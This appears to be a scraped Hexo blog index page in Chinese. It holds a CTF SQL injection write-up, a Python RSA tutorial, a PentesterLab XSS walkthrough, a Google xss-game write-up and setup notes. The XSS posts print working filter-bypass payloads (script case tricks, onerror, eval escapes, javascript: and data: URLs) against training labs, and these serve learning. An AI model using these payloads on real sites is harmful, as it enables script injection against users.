<h3 id="发现有login-php-id-1的链接，尝试从此处注入，这样就正好落入了出题人的圈套。因为这里是一个假注入点，尝试各种注入也没能找到注入点。这时需要重新寻找新的线索。查看header中是否有异样，经过仔细观察后发现，我们是从题目链接根目录刷新到一个页面，随后经过302跳转到当前页面的"><a href="#发现有login-php-id-1的链接，尝试从此处注入，这样就正好落入了出题人的圈套。因为这里是一个假注入点，尝试各种注入也没能找到注入点。这时需要重新寻找新的线索。查看header中是否有异样，经过仔细观察后发现，我们是从题目链接根目录刷新到一个页面，随后经过302跳转到当前页面的" class="headerlink" title="发现有login.php?id=1的链接，尝试从此处注入，这样就正好落入了出题人的圈套。因为这里是一个假注入点，尝试各种注入也没能找到注入点。这时需要重新寻找新的线索。查看header中是否有异样，经过仔细观察后发现，我们是从题目链接根目录刷新到一个页面，随后经过302跳转到当前页面的"></a>发现有<code>login.php?id=1</code>的链接，尝试从此处注入，这样就正好落入了出题人的圈套。因为这里是一个假注入点，尝试各种注入也没能找到注入点。这时需要重新寻找新的线索。查看header中是否有异样，经过仔细观察后发现，我们是从题目链接根目录刷新到一个页面，随后经过302跳转到当前页面的</h3>
<h3 id="仔细查看此过程的header发现了新的线索"><a href="#仔细查看此过程的header发现了新的线索" class="headerlink" title="仔细查看此过程的header发现了新的线索"></a>仔细查看此过程的header发现了新的线索</h3>
<h3 id="访问该隐藏链接，并尝试注入，发现存在字符串类型的注入"><a href="#访问该隐藏链接，并尝试注入，发现存在字符串类型的注入" class="headerlink" title="访问该隐藏链接，并尝试注入，发现存在字符串类型的注入"></a>访问该隐藏链接，并尝试注入，发现存在字符串类型的注入</h3><h4 id="其实这里我尝试了很多次也没有发现注入规律，最大的原因是注释符号-被过滤掉了-将-用-23代替后成功找到了注入点。"><a href="#其实这里我尝试了很多次也没有发现注入规律，最大的原因是注释符号-被过滤掉了-将-用-23代替后成功找到了注入点。" class="headerlink" title="其实这里我尝试了很多次也没有发现注入规律，最大的原因是注释符号#被过滤掉了,将#用%23代替后成功找到了注入点。"></a>其实这里我尝试了很多次也没有发现注入规律，最大的原因是注释符号<code>#</code>被过滤掉了,将<code>#</code>用<code>%23</code>代替后成功找到了注入点。</h4><h2 id="2-探测过滤和确定注入方式"><a href="#2-探测过滤和确定注入方式" class="headerlink" title="2.探测过滤和确定注入方式"></a>2.探测过滤和确定注入方式</h2><h3 id="使用burp的intruder功能探测过滤了哪些字符和关键字，发现过滤了-（这里最好将特殊字符进行URL编码）。"><a href="#使用burp的intruder功能探测过滤了哪些字符和关键字，发现过滤了-（这里最好将特殊字符进行URL编码）。" class="headerlink" title="使用burp的intruder功能探测过滤了哪些字符和关键字，发现过滤了,（这里最好将特殊字符进行URL编码）。"></a>使用burp的intruder功能探测过滤了哪些字符和关键字，发现过滤了<code>,</code>（这里最好将特殊字符进行URL编码）。</h3><h3 id="接下来判断此处是否是盲注，发现可以通过union注入"><a href="#接下来判断此处是否是盲注，发现可以通过union注入" class="headerlink" title="接下来判断此处是否是盲注，发现可以通过union注入"></a>接下来判断此处是否是盲注，发现可以通过union注入</h3><h2 id="3-开始注入"><a href="#3-开始注入" class="headerlink" title="3.开始注入"></a>3.开始注入</h2><h3 id="利用join来规避对于-的过滤，使用普通dump数据的语句即可完成注入"><a href="#利用join来规避对于-的过滤，使用普通dump数据的语句即可完成注入" class="headerlink" title="利用join来规避对于,的过滤，使用普通dump数据的语句即可完成注入"></a>利用join来规避对于<code>,</code>的过滤，使用普通dump数据的语句即可完成注入</h3><h2 id="4-总结"><a href="#4-总结" class="headerlink" title="4.总结"></a>4.总结</h2><h3 id="通过这道题目，我注意到以下几点："><a href="#通过这道题目，我注意到以下几点：" class="headerlink" title="通过这道题目，我注意到以下几点："></a>通过这道题目，我注意到以下几点：</h3><h3 id="1-注意对请求进行URL编码"><a href="#1-注意对请求进行URL编码" class="headerlink" title="(1)注意对请求进行URL编码"></a><em>(1)注意对请求进行URL编码</em></h3><h3 id="2-确定注入点时多尝试不同的注释符号或闭合方式"><a href="#2-确定注入点时多尝试不同的注释符号或闭合方式" class="headerlink" title="(2)确定注入点时多尝试不同的注释符号或闭合方式"></a><em>(2)确定注入点时多尝试不同的注释符号或闭合方式</em></h3><h3 id="3-注意观察请求过程中的header和内容"><a href="#3-注意观察请求过程中的header和内容" class="headerlink" title="(3)注意观察请求过程中的header和内容"></a><em>(3)注意观察请求过程中的header和内容</em></h3><h3 id="4-找不到注入点时尝试查找是否有隐藏文件"><a href="#4-找不到注入点时尝试查找是否有隐藏文件" class="headerlink" title="(4)找不到注入点时尝试查找是否有隐藏文件"></a><em>(4)找不到注入点时尝试查找是否有隐藏文件</em></h3>-->
      
    </div>
    <footer class="article-footer">
      <!--<a data-url="https://rock718.github.io.git/2019/11/25/writeup-%E2%80%9C%E7%99%BE%E5%BA%A6%E6%9D%AF%E2%80%9DCTF%E6%AF%94%E8%B5%9B-%E4%B9%9D%E6%9C%88%E5%9C%BA-SQLi/" data-id="cl9y4cx9q005a24fye1p8cpxz" class="article-share-link">Share</a>-->
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/writeup/" rel="tag">writeup</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-python-RSA" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/09/27/python-RSA/">利用Python的rsa模块加解密文件</a>
    </h1>
  

        <a href="/2017/09/27/python-RSA/" class="article-date">
  <time datetime="2017-09-27T13:05:47.000Z" itemprop="datePublished">2017-09-27</time>
</a>
      </header>
    
    <div class="article-entry-abstract" itemprop="articleBody">
      
        <!--<h2 id="1-模块安装"><a href="#1-模块安装" class="headerlink" title="1.模块安装"></a>1.模块安装</h2><p>Python默认没有安装rsa模块,所以如果编译器告诉你找不到rsa模块时,你需要安装它.</p>
<h3 id="Windows下"><a href="#Windows下" class="headerlink" title="Windows下:"></a>Windows下:</h3><p>在你安装Python的目录下找到Scripts目录,运行里面的pip.exe,其使用方式和linux下的pip一致.</p>
<p>在cmd中输入:</p>
<pre><code>pip install rsa
</code></pre>
<p>这会在Script目录下下载一些exe程序,这时rsa模块就已经安装好了</p>
<h3 id="Linux下"><a href="#Linux下" class="headerlink" title="Linux下:"></a>Linux下:</h3><p>在命令行中输入:</p>
<pre><code>pip install rsa
</code></pre>
<h2 id="2-代码示例"><a href="#2-代码示例" class="headerlink" title="2.代码示例"></a>2.代码示例</h2><h3 id="1-加密程序-encrypt-py"><a href="#1-加密程序-encrypt-py" class="headerlink" title="(1)加密程序 encrypt.py"></a>(1)加密程序 encrypt.py</h3><pre><code>import rsa
import base64
from sys import argv

try:
    plainfileName = argv[1]
    cipherFileName = argv[2]
    
    plainfileObject = open(plainfileName)
    cipherFileObject = open(cipherFileName,&quot;wb&quot;)
    try:
        message = plainfileObject.read()	# 明文
        
        #生成密钥
        (pubkey, privkey) = rsa.newkeys(2048)
        # 保存密钥
        with open(&#39;public.pem&#39;,&#39;w+&#39;) as f:
            f.write(pubkey.save_pkcs1().decode())

        with open(&#39;private.pem&#39;,&#39;w+&#39;) as f:
            f.write(privkey.save_pkcs1().decode())

        # 公钥加密
        crypto = base64.encodestring(rsa.encrypt(message.encode(), pubkey))
        # print(str(crypto,encoding = &#39;utf-8&#39;))
        cipherFileObject.write(crypto)
        
    finally:
        plainfileObject.close()
        cipherFileObject.close()
except:
    print(&quot;Example:\nencrypt.py plainfileName cipherFileName&quot;)
</code></pre>
<p>该程序会要求你以这样的方式运行它:</p>
<pre><code>encrypt.py plainfileName cipherFileName
</code></pre>
<p>其中plainfileName是你要加密的文件名,cipherFileName是密文保存的文件名   </p>
<h3 id="3-解密代码示例-decrypt-py"><a href="#3-解密代码示例-decrypt-py" class="headerlink" title="(3)解密代码示例 decrypt.py"></a>(3)解密代码示例 decrypt.py</h3><pre><code>import rsa
import base64
from sys import argv

try:

    fileName = argv[1]
    publicKey = argv[2]
    privateKey = argv[3]

    fileObject = open(fileName,&quot;rb&quot;)
    try:
        crypto = fileObject.read()	# 明文
        
        # 导入密钥
        with open(publicKey,&#39;r&#39;) as f:
            pubkey = rsa.PublicKey.load_pkcs1(f.read().encode())

        with open(privateKey,&#39;r&#39;) as f:
            privkey = rsa.PrivateKey.load_pkcs1(f.read().encode())

        # 私钥解密
        message = rsa.decrypt(base64.decodestring(crypto), privkey).decode()
        print(message)
    finally:
        fileObject.close()
except:
    print(&quot;Example:\ndecrypt.py fileName publicKey privateKey&quot;)
</code></pre>
<p>该程序会要求你以这样的方式运行它:</p>
<pre><code>decrypt.py fileName publicKey privateKey
</code></pre>
<p>fileName指你要解密的文件,publicKey是当时加密时生成的公钥文件,privateKey是私钥文件</p>
-->
      
    </div>
    <footer class="article-footer">
      <!--<a data-url="https://rock718.github.io.git/2017/09/27/python-RSA/" data-id="cl9y4cx9q005724fyd35bezfq" class="article-share-link">Share</a>-->
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/python/" rel="tag">python</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-WebForPentester-XSS" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/09/16/WebForPentester-XSS/">WebForPentester_XSS</a>
    </h1>
  

        <a href="/2017/09/16/WebForPentester-XSS/" class="article-date">
  <time datetime="2017-09-16T12:59:59.000Z" itemprop="datePublished">2017-09-16</time>
</a>
      </header>
    
    <div class="article-entry-abstract" itemprop="articleBody">
      
        <!--<h2 id="站点-https-pentesterlab-com-exercises-web-for-pentester-x2F"><a href="#站点-https-pentesterlab-com-exercises-web-for-pentester-x2F" class="headerlink" title="站点:https://pentesterlab.com/exercises/web_for_pentester&#x2F;"></a>站点:<a target="_blank" rel="noopener" href="https://pentesterlab.com/exercises/web_for_pentester/">https://pentesterlab.com/exercises/web_for_pentester&#x2F;</a></h2><h2 id="从上面的站点下载好iso镜像后在虚拟机中启动"><a href="#从上面的站点下载好iso镜像后在虚拟机中启动" class="headerlink" title="从上面的站点下载好iso镜像后在虚拟机中启动"></a>从上面的站点下载好iso镜像后在虚拟机中启动</h2><h2 id="Example-1"><a href="#Example-1" class="headerlink" title="Example 1"></a>Example 1</h2><h3 id="思路-首先查看HTML页面-发现没有用户输入的地方-然后看URL-发现”-name-x3D-hacker”-测试改变name的值-发现页面会返回name的值-确定name为注入点-第一题一般很简单"><a href="#思路-首先查看HTML页面-发现没有用户输入的地方-然后看URL-发现”-name-x3D-hacker”-测试改变name的值-发现页面会返回name的值-确定name为注入点-第一题一般很简单" class="headerlink" title="思路: 首先查看HTML页面,发现没有用户输入的地方.然后看URL,发现”?name&#x3D;hacker”.测试改变name的值,发现页面会返回name的值.确定name为注入点.第一题一般很简单."></a>思路: 首先查看HTML页面,发现没有用户输入的地方.然后看URL,发现”?name&#x3D;hacker”.测试改变name的值,发现页面会返回name的值.确定name为注入点.第一题一般很简单.</h3><h3 id="答案"><a href="#答案" class="headerlink" title="答案:"></a>答案:</h3><pre><code>/xss/example1.php?name=&lt;script&gt;alert()&lt;/script&gt;
</code></pre>
<h2 id="Example-2"><a href="#Example-2" class="headerlink" title="Example 2"></a>Example 2</h2><h3 id="思路-采用上一题的答案进行测试-发现程序过滤了-lt-script-gt-和-lt-x2F-script-gt-但是HTML标签不区分大小写-so"><a href="#思路-采用上一题的答案进行测试-发现程序过滤了-lt-script-gt-和-lt-x2F-script-gt-但是HTML标签不区分大小写-so" class="headerlink" title="思路: 采用上一题的答案进行测试.发现程序过滤了&lt;script&gt;和&lt;&#x2F;script&gt;.但是HTML标签不区分大小写,so~"></a>思路: 采用上一题的答案进行测试.发现程序过滤了&lt;script&gt;和&lt;&#x2F;script&gt;.但是HTML标签不区分大小写,so~</h3><h3 id="答案-1"><a href="#答案-1" class="headerlink" title="答案:"></a>答案:</h3><pre><code>/xss/example2.php?name=&lt;Script&gt;alert()&lt;/scRipt&gt;
</code></pre>
<h2 id="Example-3"><a href="#Example-3" class="headerlink" title="Example 3"></a>Example 3</h2><h3 id="思路-通过测试发现程序只过滤了一遍-lt-script-gt-与-lt-x2F-script-gt-标签"><a href="#思路-通过测试发现程序只过滤了一遍-lt-script-gt-与-lt-x2F-script-gt-标签" class="headerlink" title="思路:通过测试发现程序只过滤了一遍&lt;script&gt;与&lt;&#x2F;script&gt;标签."></a>思路:通过测试发现程序只过滤了一遍&lt;script&gt;与&lt;&#x2F;script&gt;标签.</h3><h3 id="答案-2"><a href="#答案-2" class="headerlink" title="答案:"></a>答案:</h3><pre><code>?name=&lt;script&lt;script&gt;&gt;alert()&lt;/script&lt;/script&gt;&gt;
</code></pre>
<h2 id="Example-4"><a href="#Example-4" class="headerlink" title="Example 4"></a>Example 4</h2><h3 id="思路-完全过滤了script标签-考虑使用-lt-img-gt-标签"><a href="#思路-完全过滤了script标签-考虑使用-lt-img-gt-标签" class="headerlink" title="思路:完全过滤了script标签,考虑使用&lt;img&gt;标签."></a>思路:完全过滤了script标签,考虑使用&lt;img&gt;标签.</h3><h3 id="答案-3"><a href="#答案-3" class="headerlink" title="答案:"></a>答案:</h3><pre><code>name=&lt;img src=&quot;&quot; onerror=&quot;alert()&quot;&gt;
</code></pre>
<h2 id="Example-5"><a href="#Example-5" class="headerlink" title="Example 5"></a>Example 5</h2><h3 id="思路-过滤了”alert”的大小写-考虑使用evel-函数配合Unicode编码"><a href="#思路-过滤了”alert”的大小写-考虑使用evel-函数配合Unicode编码" class="headerlink" title="思路: 过滤了”alert”的大小写,考虑使用evel()函数配合Unicode编码."></a>思路: 过滤了”alert”的大小写,考虑使用evel()函数配合Unicode编码.</h3><h3 id="tips-eval-函数可计算某个字符串，并执行其中的-JavaScript-代码"><a href="#tips-eval-函数可计算某个字符串，并执行其中的-JavaScript-代码" class="headerlink" title="tips: eval() 函数可计算某个字符串，并执行其中的 JavaScript 代码."></a>tips: eval() 函数可计算某个字符串，并执行其中的 JavaScript 代码.</h3><h3 id="答案-4"><a href="#答案-4" class="headerlink" title="答案:"></a>答案:</h3><pre><code>?name=&lt;script&gt;eval(\u0061\u006c\u0065\u0072\u0074())&lt;/script&gt;
</code></pre>
<h2 id="Example-6"><a href="#Example-6" class="headerlink" title="Example 6"></a>Example 6</h2><h3 id="思路-查看HTML页面-很明显是使用JavaScript语言的注释"><a href="#思路-查看HTML页面-很明显是使用JavaScript语言的注释" class="headerlink" title="思路: 查看HTML页面,很明显是使用JavaScript语言的注释."></a>思路: 查看HTML页面,很明显是使用JavaScript语言的注释.</h3><h3 id="答案-5"><a href="#答案-5" class="headerlink" title="答案:"></a>答案:</h3><pre><code>?name=&quot;;alert()
</code></pre>
<h2 id="Example-7"><a href="#Example-7" class="headerlink" title="Example 7"></a>Example 7</h2><h3 id="思路-上一题闭合双引号-这一题单引号"><a href="#思路-上一题闭合双引号-这一题单引号" class="headerlink" title="思路: 上一题闭合双引号,这一题单引号."></a>思路: 上一题闭合双引号,这一题单引号.</h3><h3 id="答案-6"><a href="#答案-6" class="headerlink" title="答案:"></a>答案:</h3><pre><code>?name=&#39;;alert()
</code></pre>
<h2 id="Example-8"><a href="#Example-8" class="headerlink" title="Example 8"></a>Example 8</h2><h3 id="思路-一开始被输入框误导-以为从输入框注入-后来才发现是从-lt-form-gt-标签入手-仔细观察发现-lt-form-gt-标签的action字段属性的值与URL有关"><a href="#思路-一开始被输入框误导-以为从输入框注入-后来才发现是从-lt-form-gt-标签入手-仔细观察发现-lt-form-gt-标签的action字段属性的值与URL有关" class="headerlink" title="思路: 一开始被输入框误导,以为从输入框注入,后来才发现是从&lt;form&gt;标签入手.仔细观察发现&lt;form&gt;标签的action字段属性的值与URL有关."></a>思路: 一开始被输入框误导,以为从输入框注入,后来才发现是从&lt;form&gt;标签入手.仔细观察发现&lt;form&gt;标签的action字段属性的值与URL有关.</h3><img src="../../../../images/2017/09/8.png">

<h3 id="答案-7"><a href="#答案-7" class="headerlink" title="答案:"></a>答案:</h3><pre><code>example8.php/&quot;%20method=&quot;POST&quot;&gt;&lt;script&gt;alert()&lt;/script&gt;&lt;!--
</code></pre>
<h3 id="tips-lt-form-gt-标签用于为用户输入创建-HTML-表单。action属性规定当提交表单时向何处发送表单数据。"><a href="#tips-lt-form-gt-标签用于为用户输入创建-HTML-表单。action属性规定当提交表单时向何处发送表单数据。" class="headerlink" title="tips:&lt;form&gt;标签用于为用户输入创建 HTML 表单。action属性规定当提交表单时向何处发送表单数据。"></a>tips:&lt;form&gt;标签用于为用户输入创建 HTML 表单。action属性规定当提交表单时向何处发送表单数据。</h3><h2 id="Example-9"><a href="#Example-9" class="headerlink" title="Example 9"></a>Example 9</h2><h3 id="思路-注意到代码中的"><a href="#思路-注意到代码中的" class="headerlink" title="思路: 注意到代码中的"></a>思路: 注意到代码中的</h3><pre><code>document.write(location.hash.substring(1))
</code></pre>
<h3 id="显然是利用锚注入"><a href="#显然是利用锚注入" class="headerlink" title="显然是利用锚注入"></a>显然是利用锚注入</h3><h3 id="答案-8"><a href="#答案-8" class="headerlink" title="答案:"></a>答案:</h3><pre><code>#&lt;script&gt;alert()&lt;/script&gt;
</code></pre>
-->
      
    </div>
    <footer class="article-footer">
      <!--<a data-url="https://rock718.github.io.git/2017/09/16/WebForPentester-XSS/" data-id="cl9y4cx9j001k24fy7kw41wnp" class="article-share-link">Share</a>-->
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/xss/" rel="tag">xss</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-kali-XX-Net" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/09/03/kali-XX-Net/">kali 安装 XX-Net openssl报错</a>
    </h1>
  

        <a href="/2017/09/03/kali-XX-Net/" class="article-date">
  <time datetime="2017-09-03T03:21:09.000Z" itemprop="datePublished">2017-09-03</time>
</a>
      </header>
    
    <div class="article-entry-abstract" itemprop="articleBody">
      
        <!--<h2 id="XX-Net是一款开源vpn软件-通过利用GAE-Google-App-Engine-作为代理服务器-具体的安装方法请参照https-github-com-XX-net-XX-Net-上面说得很详细"><a href="#XX-Net是一款开源vpn软件-通过利用GAE-Google-App-Engine-作为代理服务器-具体的安装方法请参照https-github-com-XX-net-XX-Net-上面说得很详细" class="headerlink" title="XX-Net是一款开源vpn软件.通过利用GAE(Google App Engine)作为代理服务器.具体的安装方法请参照https://github.com/XX-net/XX-Net,上面说得很详细."></a>XX-Net是一款开源vpn软件.通过利用GAE(<a href="appengine.google.com">Google App Engine</a>)作为代理服务器.具体的安装方法请参照<a target="_blank" rel="noopener" href="https://github.com/XX-net/XX-Net">https://github.com/XX-net/XX-Net</a>,上面说得很详细.</h2><h2 id="但是kali或是debian的一些系统在安装时会发生一些问题"><a href="#但是kali或是debian的一些系统在安装时会发生一些问题" class="headerlink" title="但是kali或是debian的一些系统在安装时会发生一些问题."></a>但是kali或是debian的一些系统在安装时会发生一些问题.</h2><h2 id="当运行start文件时会报python-openssl相关的一些错误-这主要是由于pyopenssl的版本过低-与python2-7不兼容-导致无法正确导入OpenSSL包"><a href="#当运行start文件时会报python-openssl相关的一些错误-这主要是由于pyopenssl的版本过低-与python2-7不兼容-导致无法正确导入OpenSSL包" class="headerlink" title="当运行start文件时会报python-openssl相关的一些错误,这主要是由于pyopenssl的版本过低,与python2.7不兼容.导致无法正确导入OpenSSL包."></a>当运行start文件时会报python-openssl相关的一些错误,这主要是由于pyopenssl的版本过低,与python2.7不兼容.导致无法正确导入OpenSSL包.</h2><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案 :"></a>解决方案 :</h2><pre><code>pip uninstall pyopenssl
pip install pyopenssl
</code></pre>
<h2 id="升级后的pyopenssl版本应为16-2-0"><a href="#升级后的pyopenssl版本应为16-2-0" class="headerlink" title="升级后的pyopenssl版本应为16.2.0"></a>升级后的pyopenssl版本应为16.2.0</h2>-->
      
    </div>
    <footer class="article-footer">
      <!--<a data-url="https://rock718.github.io.git/2017/09/03/kali-XX-Net/" data-id="cl9y4cx9k001u24fy2w256n1c" class="article-share-link">Share</a>-->
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/vpn/" rel="tag">vpn</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-xss-game-writeup" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/08/14/xss-game-writeup/">google xss-game 题目解答</a>
    </h1>
  

        <a href="/2017/08/14/xss-game-writeup/" class="article-date">
  <time datetime="2017-08-14T03:21:09.000Z" itemprop="datePublished">2017-08-14</time>
</a>
      </header>
    
    <div class="article-entry-abstract" itemprop="articleBody">
      
        <!--<h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0.前言"></a>0.前言</h2><p>在花了一个下午和晚上之后,终于做完了这六道题目,感觉还是挺有收获的.整体感觉这六道题目比较简单,难度不高.</p>
<p>这是站点 : <a target="_blank" rel="noopener" href="https://xss-game.appspot.com/">https://xss-game.appspot.com/</a></p>
<h2 id="1-闲言少叙-书归正转"><a href="#1-闲言少叙-书归正转" class="headerlink" title="1.闲言少叙,书归正转."></a>1.闲言少叙,书归正转.</h2><h3 id="Level-1-Hello-world-of-XSS"><a href="#Level-1-Hello-world-of-XSS" class="headerlink" title="Level 1: Hello, world of XSS"></a>Level 1: Hello, world of XSS</h3><p>入手点：<br>    level.py的第44行代码</p>
<pre><code>  # Our search engine broke, we found no results :-(
      message = &quot;Sorry, no results were found for &lt;b&gt;&quot; + query + &quot;&lt;/b&gt;.&quot;
      message += &quot; &lt;a href=&#39;?&#39;&gt;Try again&lt;/a&gt;.&quot;
</code></pre>
<p>思路：<br>    直接闭合 &lt;b&gt; 标签,插入js代码</p>
<p>答案：</p>
<pre><code>&lt;/b&gt;&lt;script&gt;alert()&lt;/script&gt;&lt;b&gt;
</code></pre>
<h3 id="Level-2-Persistence-is-key"><a href="#Level-2-Persistence-is-key" class="headerlink" title="Level 2: Persistence is key"></a>Level 2: Persistence is key</h3><p>入手点：<br>    index.html的第30行代码</p>
<pre><code>html += &quot;&lt;blockquote&gt;&quot; + posts[i].message + &quot;&lt;/blockquote&quot;;
</code></pre>
<p>思路：<br>    这道题我一开始想用上道题的套路，但显然不可以。具体为什么我还不是很明白。根据题目的提示，貌似可以利用 &lt;img&gt; 标签的onerror属性。</p>
<p>答案：</p>
<pre><code>&lt;img src=&quot;***&quot; onerror=&quot;alert()&quot;&gt;
</code></pre>
<h3 id="Level-3-That-sinking-feeling…"><a href="#Level-3-That-sinking-feeling…" class="headerlink" title="Level 3: That sinking feeling…"></a>Level 3: That sinking feeling…</h3><p>入手点：<br>    index.html的第17行代码</p>
<pre><code>html += &quot;&lt;img src=&#39;/static/level3/cloud&quot; + num + &quot;.jpg&#39; /&gt;&quot;;
</code></pre>
<p>思路：<br>    这道题乍一看没有让用户输入的地方。通过查看代码第43行，我们知道页面会调用chooseTab函数，将url中#后面的字符串做为参数传入。我们需要构造一个字符串，使img标签加载的时候执行我们的代码。</p>
<p>答案：</p>
<pre><code>&#39;onerror=&quot;alert()&quot;/&gt;
</code></pre>
<h3 id="Level-4-Context-matters"><a href="#Level-4-Context-matters" class="headerlink" title="Level 4: Context matters"></a>Level 4: Context matters</h3><p>入手点：<br>    timer.html的第21行代码</p>
<pre><code>&lt;img src=&quot;/static/loading.gif&quot; onload=&quot;startTimer(&#39;&#123;&#123; timer &#125;&#125;&#39;);&quot; /&gt;
</code></pre>
<p>思路：<br>    这道题通过构造特殊的timer变量值，使得<img>标签中的js代码得以执行。</p>
<p>答案：</p>
<pre><code>&#39;),alert()//
</code></pre>
<p>在做题目的时候发现自己的输入被转义成了html实体，以为无法被指执行，所以想破头也没想出来。在看了答案后才知道是能够被执行的。不过我还是不知道这是为什么？</p>
<img src="../../../../images/2017/08/level4.jpg">

<h3 id="Level-5-Breaking-protocol"><a href="#Level-5-Breaking-protocol" class="headerlink" title="Level 5: Breaking protocol"></a>Level 5: Breaking protocol</h3><p>入手点：<br>    signup.html的第15行代码</p>
<pre><code>&lt;a href=&quot;&#123;&#123; next &#125;&#125;&quot;&gt;Next &gt;&gt;&lt;/a&gt;
</code></pre>
<p>思路：<br>    通过查看代码，三个html都是很简单的页面，只有signup.html调用了next变量，并放到了 &lt;a&gt; 标签中，我不禁想到利用其执行js代码。再通过读level.py我了解到当页面的url参数带有”signup”时，next的值为next变量获得的参数值。那么这道题目就很简单了，我们只需要利用 &lt;a&gt; 标签的url来执行代码。</p>
<p>答案：</p>
<pre><code>javascript:alert()
</code></pre>
<img src="../../../../images/2017/08/level5.jpg">

<h3 id="Level-6-Follow-the-rabbit"><a href="#Level-6-Follow-the-rabbit" class="headerlink" title="Level 6: Follow the rabbit"></a>Level 6: Follow the rabbit</h3><p>入手点：<br>    index.html的第17~25行代码。</p>
<pre><code>var scriptEl = document.createElement(&#39;script&#39;);

  // This will totally prevent us from loading evil URLs!
  if (url.match(/^https?:\/\//)) &#123;
    setInnerText(document.getElementById(&quot;log&quot;),
      &quot;Sorry, cannot load a URL containing \&quot;http\&quot;.&quot;);
    return;
  &#125;
</code></pre>
<p>思路：<br>    题目说得很清楚，利用外部js脚本执行alert()。但最大的问题是对我们给出的url做了过滤。这让我很头疼，心想难道 &lt;script&gt; 标签难道还有其他的属性可以利用？后来才了解到到题目只对小写的http和https过滤了，而url的协议与地址部分是不区分大小写的，也就是说我写成hTtPs:&#x2F;&#x2F;也是没问题的！</p>
<p>答案：</p>
<pre><code>HTTPS://www.rockblog.cn/test.js
</code></pre>
<img src="../../../../images/2017/08/level6(1).jpg">

<p>让我惊喜的是还有一种在我看来更惊艳的答案，利用了data类型的url。</p>
<p>解决方案如下：</p>
<pre><code>data:text,alert()
</code></pre>
<img src="../../../../images/2017/08/level6(2).jpg">
    
<p>在下实在是佩服！</p>
-->
      
    </div>
    <footer class="article-footer">
      <!--<a data-url="https://rock718.github.io.git/2017/08/14/xss-game-writeup/" data-id="cl9y4cx9q005824fy2bvt6epn" class="article-share-link">Share</a>-->
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/xss/" rel="tag">xss</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-hexo_build" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/07/11/hexo_build/">利用腾讯云服务器搭建hexo博客</a>
    </h1>
  

        <a href="/2017/07/11/hexo_build/" class="article-date">
  <time datetime="2017-07-11T03:21:09.000Z" itemprop="datePublished">2017-07-11</time>
</a>
      </header>
    
    <div class="article-entry-abstract" itemprop="articleBody">
      
        <!--<h2 id="0-写在前面"><a href="#0-写在前面" class="headerlink" title="0.写在前面"></a>0.写在前面</h2><p>在之前的腾讯云服务器上,我的博客使用的是wordpress(虽然并没有写多少东西 (..!) ),作为一款功能强大的cms,用来搭建博客有点”大炮打蚊子”,而且由于采用的是动态页面,有时会出现DB error之类的错误.作为一个写博客的萌新,实在是有点招架不住.后来了解到了利用nodejs生成静态页面的hexo,感觉比较适合我这样的懒人.</p>
<h5 id="本篇博客其中部分内容引用了以下两篇文章-请不明白的同学访问其链接-取长补短-在此也感谢这两篇文章对我搭建博客的帮助"><a href="#本篇博客其中部分内容引用了以下两篇文章-请不明白的同学访问其链接-取长补短-在此也感谢这两篇文章对我搭建博客的帮助" class="headerlink" title="本篇博客其中部分内容引用了以下两篇文章,请不明白的同学访问其链接,取长补短,在此也感谢这两篇文章对我搭建博客的帮助."></a>本篇博客其中部分内容引用了以下两篇文章,请不明白的同学访问其链接,取长补短,在此也感谢这两篇文章对我搭建博客的帮助.</h5><p><a target="_blank" rel="noopener" href="https://www.qcloud.com/community/article/241080001487926962">在 Ubuntu 14.04 服务器上部署 Hexo 博客</a></p>
<p><a target="_blank" rel="noopener" href="https://www.qcloud.com/community/article/863136">【腾讯云的1001种玩法】Hello Hexo之静态博客搭建+自动部署</a></p>
<h2 id="1-搭建流程"><a href="#1-搭建流程" class="headerlink" title="1.搭建流程"></a>1.搭建流程</h2><p>1.1 hexo的基本工作原理在我理解中是通过本地的hexo软件解析作者用markdown写好的文件,根据配置生成各种html css js 文件,上传到服务器的指定文件夹下.服务器端通过nginx开启访问服务,浏览器就可以通过访问服务器看到你的网页了.</p>
<p>1.2 我的虚拟主机采用ubuntu16.04镜像,服务器采用nginx.本地端使用的是kali(可能使用ubuntu会方便一些).</p>
<p>首先需要在本地端安装nodejs</p>
<pre><code>apt-get install nodejs
</code></pre>
<p>在安装过nodejs后npm也自动安装好了<br>然后再安装hexo</p>
<pre><code>npm install hexo-cli hexo-server -g
</code></pre>
<p>hexo-cli 是 Hexo 的命令行工具，可用于快速新建、发布、部署博客；hexo-server 是 Hexo 的内建服务器，可用于部署前的预览和测试。-g 选项，表示全局安装。</p>
<p>接下来,我们初始化一个hexo文件夹,以后所有对hexo的操作都在这个文件夹中进行了</p>
